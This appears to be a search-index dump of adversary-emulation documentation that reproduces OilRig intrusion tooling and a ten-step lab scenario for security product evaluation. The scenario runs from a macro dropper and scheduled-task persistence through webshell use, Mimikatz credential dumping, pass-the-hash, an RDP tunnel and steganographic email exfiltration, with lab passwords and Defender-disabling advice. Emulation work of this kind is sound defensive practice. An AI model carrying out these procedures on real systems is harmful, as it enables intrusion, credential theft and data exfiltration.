set to Disabled. When in doubt, run the set-defender.ps1 script from prior ATT&CK Evaluations or manually disable this feature from the security dashboard.","Before closing the document, check to ensure all artifacts were dropped to disk under the current user's AppData\\Local directory.","SystemFailureReporter\\b.doc","SystemFailureReporter\\update.xml","Close the document and run the following from a PowerShell or CMD prompt to validate the schtask was created.","schtasks /query /TN SystemFailureReporter /V /FO LIST","With the control server open and running, run the following to manually run the SystemFailureReporter schtask. You should receive a new session:","schtasks /run /TN SystemFailureReporter"]},{"l":"Cleanup","p":["Remove the schtask for the target host:","schtasks /delete /tn SystemFailureReporter","Remove the %LOCALAPPDATA%\\SystemFailureReporter\\ directory and its contents."]},{"l":"Scenario Deployment","p":["The armed document has been zipped in a password protected archive Marketing_Materials.zip using the password !M@rk3ting! and will be hosted on the C2 server for download. An email will be sent from shirinfarhad[.]com containing the link and password to the zip file for the user to open as part of OilRig gaining initial access."]},{"l":"Cited Intelligence","p":["https://research.checkpoint.com/2021/irans-apt34-returns-with-an-updated-arsenal/","https://hybrid-analysis.com/sample/13c27e5049a7fc5a36416f2c1ae49c12438d45ce50a82a96d3f792bfdacf3dcd?environmentId=100"]}],[{"l":"SideTwist Dropper Tests","p":["These tests expect compilation of a TestProgram.exe. The sample code is provided and can be compiled using gcc:"]}],[{"l":"Mimikatz","p":["Mimikatz was used to list all available provider credentials using sekurlsa::logonPasswords and perform Pass-The-Hash via sekurlsa::pth.","For this scenario, no significant changes were made to the original functionality of Mimikatz.","Source code and pre-built Mimikatz can be downloaded from: https://github.com/gentilkiwi/mimikatz/"]},{"l":"Dependencies","p":["To build the binary with the following instructions, you will need the following dependencies downloaded and installed:","Microsoft Visual Studio","Windows Driver Developer Kit (WinDDK)"]},{"l":"Build Instructions","p":["From the mimikatz folder, run the following command:","The resulting executable will be found in the x64 folder created during the build process.","This executable should be renamed as m64.exe and should be copied to Resources/payloads/TwoFace."]},{"i":"cti-sources","l":"\uD83D\uDD2C CTI Sources","p":["Unit42's TwoFace Webshell: Persistent Access Point for Lateral Movement","Unit42's Striking Oil: A Closer Look at Adversary Infrastructure","Unit42's Oilrig Playbook Viewer"]},{"i":"att-ck-techniques","l":"\uD83D\uDD2C ATT&CK Techniques","p":["While Mimikatz covers a wider range of techniques, the version used in the scenario displayed the following:","(Step6) T1003.001- OS Credential Dumping: LSASS Memory","(Step8) T1550.002- Use Alternate Authentication Material: Pass the Hash"]}],[{"l":"OilRig Scenario Cleanup Procedures","p":["Clean up scripts provided will check and delete all artifacts. The script will also force reboot the host at the end of the script's execution."]},{"i":"theblock-10015","l":"THEBLOCK (10.0.1.5)","p":["RDP into THEBLOCK as follows:","Open PowerShell and select \"Run as Administrator\":"]},{"l":"Artifact List"},{"i":"sidetwist-droppersidetwist","l":"SideTwist Dropper/SideTwist","p":["SystemFailureReporter schtask","C:\\Users\\gosta\\Downloads\\Marketing_Materials.zip","C:\\Users\\gosta\\Downloads\\GGMS Overview.doc","C:\\Users\\gosta\\AppData\\Local\\SystemFailureReporter\\","(File renamed) C:\\Users\\gosta\\AppData\\Local\\SystemFailureReporter\\b.doc","C:\\Users\\gosta\\AppData\\Local\\SystemFailureReporter\\SystemFailureReporter.exe","(Removed in scenario) C:\\Users\\gosta\\AppData\\Local\\SystemFailureReporter\\update.xml"]},{"l":"VALUEVAULT","p":["(Removed in scenario) C:\\users\\gosta\\AppData\\Roaming\\b.exe","(Removed in scenario) C:\\users\\gosta\\AppData\\Roaming\\fsociety.dat"]},{"l":"Other","p":["(Removed in scenario) C:\\Users\\Public\\Downloads\\plink.exe","(Removed in scenario) C:\\Users\\Public\\contact.aspx"]},{"i":"waterfalls-10016","l":"WATERFALLS (10.0.1.6)","p":["RDP into WATERFALLS as follows:","Open PowerShell and select \"Run as Administrator\":"]},{"i":"artifact-list-1","l":"Artifact List"},{"l":"TwoFace","p":["C:\\Program Files\\Microsoft\\Exchange Server\\V15\\ClientAccess\\exchweb\\ews\\contact.aspx"]},{"i":"other-1","l":"Other","p":["(Removed in scenario) C:\\Windows\\System32\\m64.exe","(Removed in scenario) C:\\Windows\\Temp\\01.txt","(Removed in scenario) C:\\Windows\\System32\\ps.exe","(Removed in scenario) C:\\Windows\\temp\\Nt.dat","(Removed in scenario) C:\\Windows\\System32\\mom64.exe"]},{"i":"endofroad-10017","l":"ENDOFROAD (10.0.1.7)","p":["RDP into WATERFALLS as follows:","Open PowerShell and select \"Run as Administrator\":"]},{"i":"artifact-list-2","l":"Artifact List"},{"l":"RDAT","p":["(File renamed) C:\\ProgramData\\Nt.dat","(Removed in scenario) C:\\ProgramData\\VMware\\","(Removed in scenario) C:\\ProgramData\\VMware\\VMware.exe","C:\\Program Files\\Microsoft SQL Server\\MSSQL15.MSSQLSERVER\\MSSQL\\Backup\\guest.bmp","C:\\Program Files\\Microsoft SQL Server\\MSSQL15.MSSQLSERVER\\MSSQL\\Backup\\guest.bmp.tmp"]}],[{"l":"RDAT","p":["RDAT is a backdoor used by the suspected Iranian threat group OilRig. RDAT was originally identified in 2017 and targeted companies in the telecommunications sector.[1][2] This emulated version of RDAT will leverage the EWS API by loading Microsoft.Exchange.WebServices.dll. It will connect to the EWS email server and send emails with a .bmp that contains chunks of data from given file to be exfiltrated.","Microsoft.Exchange.WebServices.dll is not included by default in this repository. Follow Microsoft's documentation for retrieving the DLL from an existing installation of Exchange or for using the open source EWS Managed API. The DLL should be placed in Resources/RDAT for building the RDAT executable.","NOTE: Tests and usage assume an Exchange server has been configured for the environment and should be run from a domain joined Windows host with network access to the Exchange server. This implementation also expects a username and passowrd for a configured user that can authenticate to the Exchange server."]},{"l":"Build Instructions"},{"l":"Windows"},{"i":"download-net-60-sdk-x64-for-windows","l":"Download .NET 6.0 SDK x64 for Windows","p":["https://dotnet.microsoft.com/en-us/download/dotnet/6.0"]},{"l":"Build EXE","p":["Open a command (cmd.exe) prompt","The compiled binary should be copied to Resources\\payloads\\TwoFace for Step 8 and 10."]},{"l":"Test Instructions","p":["Open a command (cmd.exe) prompt"]},{"l":"Usage Examples","p":["Go to running directory of RDAT.exe"]},{"l":"Cleanup Instructions","p":["Go to running directory of RDAT.exe"]},{"l":"CTI Evidence","p":["[1] https://attack.mitre.org/software/S0495/[2] https://unit42.paloaltonetworks.com/oilrig-novel-c2-channel-steganography/"]}],[{"l":"SideTwist Implant"},{"l":"About","p":["The SideTwist implant consists of a single executable. In emulated execution, it only executes a single command at a time, waiting to again be called by a scheduled task. In the default execution, no arguments are required as the C2 address and port are hard-coded. This implementation contains optional arguments to make testing with it a little easier.","At a high level, the lifecycle of the implant consists of the following actions:","An additional file, update.xml, is required for execution. The implant checks the user's%LOCALAPPDATA%\\SystemFailureReporter folder and terminates if not found. The file does not need to contain anything. This is a small deviation from the CTI which used a relative path. Upon testing with scheduled tasks from the command line, it appears that the binary was being run from a different path and subsequently unable to follow the relative link. Without using an XP-compatible version of schtasks from the command line, the \"Start In\" variable seemingly cannot be set in CMD to allow for the use of relative paths."]},{"l":"Build","p":["The implant can be built in Visual Studio, with the Developer Command Prompt from VS, or with msbuild.exe which can be obtained separately from VS. Whichever option is chosen, ensure the file update.xml exists in %LOCALAPPDATA%\\SystemFailureReporter\\. For example, for user gosta, place the update.xml file in C:\\Users\\gosta\\AppData\\Local\\SystemFailureReporter. The file does not need to contain any data."]},{"l":"Developer Prompt","p":["Open a developer command prompt and navigate to the directory containing the solution file SideTwist.sln(it should be located in the same directory as the SideTwist and SideTwistTests code folders). Once there, run the following:","devenv.exe SideTwist.sln /build Release","The executable will be found in the release folder, typically located in .\\x64\\Release."]},{"l":"Run","p":["The program can be run without arguments to use the hard-coded values. These values are:","Without arguments, the implant will execute once and exit. To ease testing, additional arguments are available in the SideTwist-loopable.exe version (or by swapping out the main.cpp for the one found in SideTwist\\loopable_version). NOTE: This loopable version simply checks the local relative path for update.xml and will not work with scheduled tasks."]},{"l":"Note on Command Strings","p":["When issuing a command execution instruction (101 or 104), the default executor is CMD. Do not supply \"cmd /c\" as part of commands. For example, simply supply \"whoami\". Piping commands is acceptable. Note: CMD does not handle single quotes for paths.","All commands automatically redirect STDERR to STDOUT to capture errors.","For PowerShell, it is recommended you use Base64 encoded commands. Be sure to use the correct Base64 encoding (UTF-16LE). The command structure to the implant is as follows:","powershell -e base64goeshere","Do not include quotes, .exe, or cmd /c \"powershell.exe ...\".","If you have paths with spaces, recommend single quotes around the instruction with double quotes inside:","... 'dir c:\\program files'"]},{"l":"Example commands of each type"},{"l":"Tests","p":["Once the solution is built, there's a separate test executable in the release folder with the implant. Running that executable should produce the requisite test results. Some tests depend on local environment variables. They have been written to encompass the development range (e.g., the test will fail if run on anything other than dragon#).","The server connection is not currently mocked. This means a live C2 server is required for some tests. Furthermore, the C2 server needs to be on the hard-coded C2 server (192.168.0.4).","The test for run() can be run with a live server and no instruction supplied (e.g. initial registration of the implant).","The FileDownload test needs the implant to have already been registered and a specific task waiting: ... '102 c:\\users\\public\\test.txt|sidetwist_test.txt'. test.txt's contents do not matter, only that it's a non-empty, base64 encoded file."]}],[{"l":"TWOFACE WebShell Analog"},{"l":"Setup","p":["This file does not need to be compiled - it is a self contained (i.e., no code-behind file) C# application in aspx format. However, the default web.config file for the IIS site may require modifications, specifically to add the following line under the assemblies tag:","add assembly=Microsoft.Exchange.Diagnostics, Version=15.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35 /","For this scenario, OilRig has placed this webshell under C:\\Program Files\\Microsoft\\Exchange Server\\V15\\ClientAccess\\exchweb\\ews using various file names (for our purposes, contact.aspx) 1.","Default access is limited to Windows Authentication, so requests made to the page will need valid credentials for an authorized user."]},{"l":"Execution with the Shell","p":["All execution takes place via HTTP POST 1. If a GET request is sent, the C# will not execute and the visitor will be given a fake error page saying the resource cannot be found on the server. Responses to actions taken with the shell will be provided at the end of the returned page under a pre tag. If you are using PowerShell instead of cUrl to issue the request, you will need to select and expand the Content element of the response.","If Windows Authenticiation is used, cUrl commands must contain additional flags to allow for successful negotiation:--http1.1 and --ntlm. HTTPV2 does not support NTLM authentication."]},{"l":"Command Execution","p":["Command execution requires two POST parameters 1:","pro- the process to use for execution (cmd.exe or powershell.exe)","cmd- The command to execute","Commands are not URL encoded per the CTI. For complex commands, consider using Base64 and encoded PowerShell. Please note:'+' is a valid Base64 character and may be converted to a space in transit.","Examples:"]},{"l":"File Actions","p":["The webshell supports two different sets of file actions:","Upload file to the %TEMP% directory","Upload file to arbitrary path","Download file from arbitrary path","Delete file (from %TEMP% by default, or arbitrary path if supplied)"]},{"i":"temp-file-upload","l":"%TEMP% File Upload","p":["File uploads to %TEMP% ( C:\\Windows\\Temp by default) require two parameters 1:","upd- the file name to use on the victim","upb- The Base64-encoded content of the file (note: unlike encoded commands above, we have modified this command to replace spaces with '+' signs to allow for binary file uploads)","Example:"]},{"l":"Arbitrary Path File Upload","p":["This form up upload requires POST Form data and more parameters 1:","upl- the POST form field that contains the file data to write to disk","sav- the path in which to save the file","vir- boolean value to specify if this is a virtual path or physical (default)","nen- the file name on the victim(defaults to the uploaded file name)","[arbitrary] - a field containing the file information. NAME MUST MATCH THE VALUE GIVEN IN upl","Example:"]},{"l":"File Download","p":["Downloads only require a single field: don- the path to the file 1","Example:"]},{"l":"File Delete","p":["File deletes only require a single parameter: del- the name of the file to delete 1","If no path is supplied, %TEMP% will be used. Otherwise, specify path\\to\\file.ext","Examples:"]},{"l":"Testing","p":["A shell script has been provided to exercise each of the options using cUrl. The user will be prompted for a few details on where to send the requests and any authentication information (Windows Authentication only). Ensure the user running the script has write access to the directory it is being run from as a few test files will be made.","./twoface_tests.sh"]},{"l":"CTI","p":["[1] Unit 42 - TwoFace Webshell: Persistent Access Point for Lateral Movement"]}],[{"l":"VALUEVAULT","p":["VALUEVAULT is a Golang compiled version of the âWindows Vault Password Dumperâ browser credential theft tool from Massimiliano Montoro, the developer of Cain & Abel.[1]"]},{"l":"Quick Start"},{"l":"Build Instructions"},{"l":"Windows"},{"l":"Test Instructions","p":["To run vault unit tests:","To run db unit tests:"]},{"l":"Seed Credentials in Internet Explorer","p":["Open Internet Explorer OWA credentials:"]},{"l":"Usage Examples","p":["Will create SQLite database with output of Windows Credential Value for Internet Explorer","Execute:","Output:","Database layout:"]},{"l":"Cleanup Instructions"},{"l":"Read DB contents","p":["Requires Python3"]},{"l":"CTI Evidence","p":["[1] https://www.mandiant.com/resources/hard-pass-declining-apt34-invite-to-join-their-professional-network"]},{"l":"References","p":["http://web.archive.org/web/20190316025511/http://oxid.it/downloads/vaultdump.txt","https://github.com/danieljoos/winvault","https://github.com/google/uuid","https://github.com/mattn/go-sqlite3","https://pkg.go.dev/golang.org/x/sys"]}],[{"l":"Scenario Overview","p":["Legend of symbols:","\uD83D\uDCA1 - callout notes","â - extremely important note","â¡ï¸ - Switching to another session","â­ - Sign out of something","This scenario emulates OilRig TTPs based on several malware specimens either used by or associated with the OilRig actors:","SideTwist","VALUEVAULT","TwoFace","RDAT","A Note on This Document:","This all-in-one file does not include steps related to noise, which was also conducted during the week. For the purpose of the plan, presume that an active user session for Gosta is present for any SideTwist steps, necessary for the scheduled task to execute the implant. This session originated from an out-of-scope jump box"]},{"i":"step-0---setup","l":"Step 0 - Setup"},{"i":"voice-track","l":"\uD83C\uDFA4 Voice Track","p":["The C2 consists of an HTTP server that hosts a dummy a Flickr error page. Commands to the implant are embedded between <script> tags. The command itself consists of a base64-encoded blob which contains an encrypted string(using simple xor encryption). Requests to the page that do not correspond to a registered implant will simply return the dummy page.","The malicious document is delivered from a separate attacking machine running postfix."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["\uD83D\uDCA1 RDP, do not SSH, to the Linux Attack Platform 192.168.0.4 hosting the C2 server.","Open a new terminal window and cd to the cloned repo control server:","Ensure the SideTwist handler is enabled for the server:","Result:","\uD83D\uDCA1 if the output contains enabled: false, change the value in handler_config.yml to match above.","Start the control server:","â¡ï¸ SSH to the Mail and Apache Server 192.168.0.5 to ensure the malicious document ( Marketing_Materials.zip) is in /var/www/html.","Check the file exists:","\uD83D\uDCA1 If the armed and zipped file is not there, follow the instructions for creating it then copy the zip file to /var/www/html.","Restart the Apache and Postfix services to ensure they are fresh:"]},{"i":"step-1---initial-compromise-and-persistence","l":"Step 1 - Initial Compromise and Persistence"},{"i":"voice-track","l":"\uD83C\uDFA4 Voice Track","p":["Step 1 emulates OilRig gaining initial access from user gosta downloading and opening a Microsoft Word document received from a link in a spearphishing email from team@ganjavigms.com. The malicious macro enabled in the document performs the following actions when the document is first opened:","The computername and username environment variables are collected.","A sandbox detection check is performed using Application.MouseAvailable.","The SideTwist payload is embedded within the document under UserForm1.TextBox1.Text as base64-encoded data.","Two artifacts b.doc(actually an executable) and update.xml are dropped into this directory. b.doc is the SideTwist payload and update.xml is an additional empty file that, if not present, SideTwist will terminate automatically.","When the document is closed:","Another sandbox detection check is performed using Application.MouseAvailable.","b.doc is renamed to SystemFailureReporter.exe.","A scheduled task named SystemFailureReporter is created and runs SystemFailureReporter.exe every 5 minutes.","When SystemFailureReporter.exe runs:","SystemFailureReporter.exe uses the GetUserName API, GetComputerName API, and GetDomainName API to find the current user, hostname, and domain respectively.","SystemFailureReporter.exe connects to the control server (192.168.0.4) over XOR encrypted protocol HTTP on port 443."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["â¡ï¸ RDP into THEBLOCK (10.1.0.5):","Username","Password","BOOMBOX\\gosta","d0ntGoCH4$ingW8trfalls","Open Edge and browse to https://waterfalls.boom.box/owa, login as Gosta:","\uD83D\uDCA1 There should be an unread email from team@ganjavigms.com.","Open this email and click the link to download the zipped file.","Open File Explorer and navigate to the Downloads file directory.","Unzip Marketing_Materials.zip and enter the password !M@rk3ting! when prompted","Double click the extracted word document GGMS Overview.doc, click \"enable editing\", and click \"enable content\".","â Wait 30 seconds then close the document.","\uD83D\uDD0D The C2 server should register a new SideTwist callback after the document is closed."]},{"i":"source-code","l":"\uD83D\uDDFF Source Code","p":["SideTwist Dropper: SideTwist_Dropper","Dropper Payload collects environment variables: payload.vbs#L203-205","Dropper Payload sandbox detection: payload.vbs#L211","Dropper Payload directory creation: payload.vbs#L220-L225","Dropper Payload drops b.doc and update.xml: payload.vbs#L229-L235","Dropper Payload sandbox detection 2: payload.vbs#L247","Dropper Payload b.doc rename: payload.vbs#L251-L259","Dropper Payload scheduled task: payload.vbs#L140-L194","SideTwist Implant: SideTwist Implant","SideTwist collects ID info: SideTwist.cpp#L238-L280","SideTwist sets IP/port: SideTwist.cpp#L180-L219","SideTwist encrypts communications: comms.cpp#L106-L111","SideTwist XOR key: comms.h#L23"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["SideTwist: https://research.checkpoint.com/2021/irans-apt34-returns-with-an-updated-arsenal/","VBA coding/macros: https://www.intezer.com/blog/malware-analysis/new-iranian-campaign-tailored-to-us-companies-uses-updated-toolset/"]},{"i":"step-2---workstation-discovery","l":"Step 2 - Workstation Discovery"},{"i":"voice-track","l":"\uD83C\uDFA4 Voice Track","p":["Step 2 emulates OilRig performing a string of initial enumeration commands using the cmd spawned by SystemFailureReporter.exe.","OilRig enumerates the current user, system information, system network configuration information, domain users, domain groups, domain accounts, local groups, network connections, running processes, running services, and a registry key value to check if RDP is enabled.","At this point OilRig has discovered that the current user gosta is a member of EWS Admins, that EWS server WATERFALLS has the ip address of 10.1.0.6 and is part of the Exchange Trusted Subsystem group, and the existence of several other administrator groups, including SQL Admins of which user tous is a member."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["â¡ï¸ On Linux Attack Platform 192.168.0.4 as user saka, split the existing C2 terminal window horizontally, being careful to not terminate the server.","Right click Split Horizontally","In the bottom split window, issue the following commands to the implant, waiting until each task is accomplished before teeing the next one.","\uD83D\uDCA1 The implant will execute every 5 minutes.","Perform follow up discovery using gained information to determine gosta is a member of EWS Administrators, tous is a SQL administrator and the IP of WATERFALLS."]},{"i":"source-code","l":"\uD83D\uDDFF Source Code","p":["SideTwist instruction parsing: SideTwist.cpp#L65-L79","SideTwist command execution: SideTwist.cpp#L102-L114"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["SideTwist: https://research.checkpoint.com/2021/irans-apt34-returns-with-an-updated-arsenal/","VBA coding/macros: https://www.intezer.com/blog/malware-analysis/new-iranian-campaign-tailored-to-us-companies-uses-updated-toolset/","Helminth campaigns/enumeration: https://unit42.paloaltonetworks.com/the-oilrig-campaign-attacks-on-saudi-arabian-organizations-deliver-helminth-backdoor/","EWS admin/Exchange Trusted Subsystem discovery: https://unit42.paloaltonetworks.com/unit42-twoface-webshell-persistent-access-point-lateral-movement/"]},{"i":"step-3---workstation-low-privilege-credential-dumping","l":"Step 3 - Workstation Low Privilege Credential Dumping"},{"i":"voice-track","l":"\uD83C\uDFA4 Voice Track","p":["Step 3 emulates OilRig using SystemFailureReporter.exe to download VALUEVAULT(the executable for which is b.exe) which is then leveraged to perform a low privilege credential dumping. SystemFailureReporter.exe then uploads the VALUEVAULT dump (named fsociety.dat) back to C2 via HTTP POST request.","The output of the credential dump provides a plaintext password for the current user gosta."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["â¡ï¸ On Linux Attack Platform as saka, issue the command to download VALUEVAULT to the workstation","Issue the command to execute VALUEVAULT after it has been downloaded:","Issue the command to upload output of VALUEVAULT to C2 after it has executed:","Confirm that the credentials were obtained on C2 server."]},{"i":"source-code","l":"\uD83D\uDDFF Source Code","p":["SideTwist file download: SideTwist.cpp#L129-L154 and comms.cpp#L78-L9","SideTwist file upload: SideTwist.cpp#L166-L178, and SideTwist.cpp#L81-> comms.cpp#L113-L12-> comms.cpp#L172-L2","VALUEVAULT: VALUEVAULT","VALUEVAULT opens Windows Vault: vault.go#L91-L97"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["SideTwist: https://research.checkpoint.com/2021/irans-apt34-returns-with-an-updated-arsenal/","VALUEVAULT: https://www.mandiant.com/resources/hard-pass-declining-apt34-invite-to-join-their-professional-network","Open-source Windows Vault Password Dumper: http://web.archive.org/web/20190316025511/http://oxid.it/downloads/vaultdump.txt"]},{"i":"step-4---install-web-shell-on-ews","l":"Step 4 - Install Web Shell on EWS"},{"i":"voice-track","l":"\uD83C\uDFA4 Voice Track","p":["Step 4 emulates OilRig installing web shell persistence on WATERFALLS (10.1.0.6). This is accomplished by downloading the TWOFACE webshell (named contact.aspx) via SystemFailureReporter.exe; TWOFACE is then copied from THEBLOCK to WATERFALLS and hidden with attrib + h.","OilRig covers their tracks by deleting the webshell from gosta's user directory on THEBLOCK."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["The webshell is first placed on THEBLOCK (10.1.0.5) to prepare for copying via SMB to WATERFALLS.","Once in place, OilRig has copied the webshell directly into the Exchange Web Services directory.","Set the file hidden attribute on WATERFALLS and delete the webshell from THEBLOCK using SideTwist"]},{"i":"source-code","l":"\uD83D\uDDFF Source Code","p":["TwoFace Webshell: TwoFace"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["EWS lateral movement: https://unit42.paloaltonetworks.com/unit42-twoface-webshell-persistent-access-point-lateral-movement/"]},{"i":"step-5---ews-discovery","l":"Step 5 - EWS Discovery"},{"i":"voice-track","l":"\uD83C\uDFA4 Voice Track","p":["Step 5 emulates OilRig using the TWOFACE webshell to perform enumeration on the EWS WATERFALLS (10.1.0.6) to discover the SQL server ENDOFROAD (10.1.0.7).","OilRig first uses the webshell to perform some initial discovery once on the host by enumerating the current user, system network configuration and system network connections.","Output of the system network connections discovery indicates an open connection to 10.1.0.7 via a port commonly associated with SQL."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["On Linux Attack Platform box, change directories to the TwoFace payload folder:","Use the webshell to enumerate the current user.","Enumerate the system network configurations.","Use the webshell to perform network discovery on WATERFALLS (10.1.0.6), discovering a connection to host 10.1.0.7 via a port commonly associated with SQL."]},{"i":"source-code","l":"\uD83D\uDDFF Source Code","p":["TwoFace Webshell instruction parsing: contact.aspx#L12-L21","TwoFace Webshell command execution: contact.aspx#L176-L194"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["TwoFace: https://unit42.paloaltonetworks.com/unit42-twoface-webshell-persistent-access-point-lateral-movement/","Network discovery: https://unit42.paloaltonetworks.com/the-oilrig-campaign-attacks-on-saudi-arabian-organizations-deliver-helminth-backdoor/"]},{"i":"step-6---privileged-credential-dumping","l":"Step 6 - Privileged Credential Dumping"},{"i":"voice-track","l":"\uD83C\uDFA4 Voice Track","p":["Step 6 emulates OilRig using the webshell to download Mimikatz to WATERFALLS and using elevated privileges to dump credentials. The dumped credentials(stored in 01.txt) are exfiltrated back to the C2 ( 192.168.0.4) via the webshell.","After exfiltration is complete OilRig deletes both Mimikatz and the dumped credentials from the directory on WATERFALLS."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["Download Mimikatz to WATERFALLS (10.1.0.6).","Dump credentials using Mimikatz. Output includes creds for SQL server administrator tous.","\uD83D\uDCA1 privilege::debug has been included here to match the CTI, but is unnecessary due to the webshell running as SYSTEM.","Exfiltrate the resulting output file 01.txt to the attacker platform.","Display the contents of 01.txt in the terminal window.","Clean up on WATERFALLS by removing the binary and output file from C:\\Windows\\Temp\\."]},{"i":"source-code","l":"\uD83D\uDDFF Source Code","p":["â NB: The function descriptions in TwoFace (contact.aspx) refer to the Mimikatz download as \"Arbitrary Folder Upload\" and the 01.txt exfiltration as \"File Download\" which is the reverse of how said activities are described in the emulation procedure; this is to match to CTI but results in slightly contradictory source code links.","TwoFace Webshell download file to victim: contact.aspx#L58-L115","TwoFace Webshell file upload file to C2: contact.aspx#L120-L145","TwoFace Webshell temp delete: contact.aspx#L150-L169","Mimikatz: Mimikatz"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["Credential dumping: https://unit42.paloaltonetworks.com/unit42-twoface-webshell-persistent-access-point-lateral-movement/"]},{"i":"step-7---lateral-movement-to-ews-via-rdp-tunnel","l":"Step 7 - Lateral Movement to EWS via RDP Tunnel"},{"i":"voice-track","l":"\uD83C\uDFA4 Voice Track","p":["Step 7 emulates OilRig moving laterally to WATERFALLS (10.1.0.6). This is accomplished with a remote port forward using the plink command line tool(downloaded by SystemFailureReporter.exe). OilRig conducts a remote port forward from THEBLOCK (10.1.0.5) to the attacking machine to allow RDP access through port 3389 as user gosta."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["Download plink to THEBLOCK (10.1.0.5) using SideTwist and start plink tunnel to gain RDP access to WATERFALLS (10.1.0.6) from the Linux Attack Platform.","Execute the remote port forward command using SideTwist. Note: this SideTwist process will persist as long as the tunnel is open and as such will need to be closed after the activity is done. SideTwist will continue to execute via schtask so other commands can be issued to the implant if needed.","Ensure that the tunnel is open and listening on port 13389 on Linux Attack Platform.","You should see a result that looks like the following:","RDP to WATERFALLS (10.1.0.6) as user Gosta from Linux Attack Platform using the SSH tunnel."]},{"i":"source-code","l":"\uD83D\uDDFF Source Code","p":["Plink command line tool: Plink"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["Plink: https://unit42.paloaltonetworks.com/unit42-striking-oil-closer-look-adversary-infrastructure/","SSH: https://unit42.paloaltonetworks.com/oilrig-novel-c2-channel-steganography/","RDP: https://go.crowdstrike.com/rs/281-OBQ-266/images/Report2020CrowdStrikeGlobalThreatReport.pdf","RDP: https://unit42.paloaltonetworks.com/the-oilrig-campaign-attacks-on-saudi-arabian-organizations-deliver-helminth-backdoor/"]},{"i":"step-8---lateral-movement-to-the-sql-server","l":"Step 8 - Lateral Movement to the SQL Server"},{"i":"voice-track","l":"\uD83C\uDFA4 Voice Track","p":["Step 8 emulates OilRig using the credentials collected for the user tous in the previous step to move laterally to the SQL server.","First, the webshell is used to download PsExec, RDAT, and a newly named Mimikatz to disk. Through the tunneled RDP, an elevated Command Prompt is opened and, using the NTLM hash for tous from the credential dump, Mimikatz pass the hash is executed to spawn a second shell as tous on WATERFALLS (10.1.0.6). As tous, RDAT is copied over to ENDOFROAD (10.1.0.7), then PsExec is executed to get a shell on ENDOFROAD (10.1.0.7)"]},{"i":"procedures","l":"â£ï¸ Procedures","p":["Download psexec to WATERFALLS (10.1.0.6) as C:\\Windows\\System32\\ps.exe","Download RDAT to WATERFALLS (10.1.0.6) as Nt.dat","Redownload Mimikatz to WATERFALLS (10.1.0.6) as mom64.exe","In the RDP to WATERFALLS (10.1.0.6), open a new Command Prompt as Administrator, click yes to the UAC prompt, and execute Mimikatz PTH for tous","In the new Command Prompt spawned by the Mimikatz pass the hash, copy RDAT to ENDOFROAD (10.1.0.7)","In the new Command Prompt spawned by Mimikatz pass the hash, PsExec to the SQL server ENDOFROAD (10.1.0.7)"]},{"i":"source-code","l":"\uD83D\uDDFF Source Code","p":["â NB: Once again, TwoFace (contact.aspx) refers to the \"downloads\" from this section of the emulation procedure as \"Abritrary Folder Upload(s)\" in the source code.","TwoFace Webshell download file to victim: contact.aspx#L58-L115","RDAT backdoor: RDAT"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["RDAT: https://unit42.paloaltonetworks.com/oilrig-novel-c2-channel-steganography/","PSExec: https://unit42.paloaltonetworks.com/unit42-striking-oil-closer-look-adversary-infrastructure/","Mimikatz: https://unit42.paloaltonetworks.com/oilrig-novel-c2-channel-steganography/","Mimikatz: https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/waterbug-espionage-governments"]},{"i":"step-9---sql-server-discovery","l":"Step 9 - SQL Server Discovery"},{"i":"voice-track","l":"\uD83C\uDFA4 Voice Track","p":["Step 9 emulates OilRig using the command prompt (in the context of tous) created by Mimikatz pass the hash and PSExec to perform discovery of the database backup files on the SQL server ENDOFROAD (10.1.0.7)."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["Discover version of SQL server","Discover SQL server database backup files"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["Discovery: https://unit42.paloaltonetworks.com/unit42-twoface-webshell-persistent-access-point-lateral-movement/","RDAT/Exfiltration: https://unit42.paloaltonetworks.com/oilrig-novel-c2-channel-steganography/"]},{"i":"step-10---collection-and-exfiltration-of-database-files","l":"Step 10 - Collection and Exfiltration of Database Files"},{"i":"voice-track","l":"\uD83C\uDFA4 Voice Track","p":["Step 10 emulates OilRig collecting and exfiltrating backups of the database files via the EWS API.","OilRig first creates a new directory C:\\Programdata\\Vmware in which to stage the collected data. RDAT is then moved to the new directory and renamed to VMware.exe.","The newly named VMware.exe is used to read the data from sitedata_db.bak, split the data into 20000 byte chunks, and exfiltrate the chunks via EWS API to an attacker controlled email ( sistan@shirinfarhad.com). The stolen data is obfuscated within BMP images attached to the emails sent to sistan@shirinfarhad.com."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["Create directory C:\\Programdata\\Vmware","Move and rename RDAT as C:\\Programdata\\Vmware\\VMware.exe","Change directory into the SQL backup directory (PsExec has a character limit)","Execute RDAT to pull back target database backup file."]},{"i":"source-code","l":"\uD83D\uDDFF Source Code","p":["RDAT chunking: Program.cs#L104-L109","RDAT appending file bytes to guest.bmp: Program.cs#L117-L129","RDAT leverages EWS API to exfil chunks: Program.cs#L95-L115"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["RDAT/Exfiltration: https://unit42.paloaltonetworks.com/oilrig-novel-c2-channel-steganography/","TwoFace webshell: https://unit42.paloaltonetworks.com/unit42-twoface-webshell-persistent-access-point-lateral-movement/","C2 Communications: 